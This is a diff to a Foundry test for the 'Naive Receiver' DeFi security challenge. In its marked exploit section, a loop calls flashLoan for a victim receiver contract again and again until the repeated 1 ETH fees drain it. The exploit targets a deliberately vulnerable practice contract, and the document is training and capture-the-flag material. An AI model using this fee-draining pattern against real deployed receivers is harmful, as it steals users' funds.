@@ -30,9 +30,21 @@ contract NaiveReceiver is Test {
         vm.label(address(naiveReceiverLenderPool), "Naive Receiver Lender Pool");
         vm.deal(address(naiveReceiverLenderPool), ETHER_IN_POOL);
 
-        assertEq(address(naiveReceiverLenderPool).balance, ETHER_IN_POOL);
-        assertEq(naiveReceiverLenderPool.maxFlashLoan(address(0)), ETHER_IN_POOL);
-        assertEq(naiveReceiverLenderPool.flashFee(address(0), 0), 1e18);
+        address ETH = naiveReceiverLenderPool.ETH();
+
+        assertEq(
+            address(naiveReceiverLenderPool).balance, ETHER_IN_POOL, "Naive Receiver Lender Pool should have 1,000 ETH"
+        );
+        assertEq(
+            naiveReceiverLenderPool.maxFlashLoan(ETH),
+            ETHER_IN_POOL,
+            "Naive Receiver Lender Pool max flash loan should be 1,000 ETH"
+        );
+        assertEq(
+            naiveReceiverLenderPool.flashFee(ETH, 0),
+            1e18,
+            "Naive Receiver Lender Pool minimum flash fee should be 1 ETH"
+        );
 
         flashLoanReceiver = new FlashLoanReceiver(
             payable(naiveReceiverLenderPool)
@@ -49,11 +61,13 @@ contract NaiveReceiver is Test {
         /**
          * EXPLOIT START *
          */
+        address ETH = naiveReceiverLenderPool.ETH();
+        console.log("ETH address: ", ETH);
         for (uint256 i = 0; i < ETHER_IN_RECEIVER / 1 ether; i++) {
             uint256 current_receiver_balance = address(flashLoanReceiver).balance;
             naiveReceiverLenderPool.flashLoan({
                 receiver: flashLoanReceiver,
-                token: address(0),
+                token: ETH,
                 amount: current_receiver_balance,
                 data: ""
             });
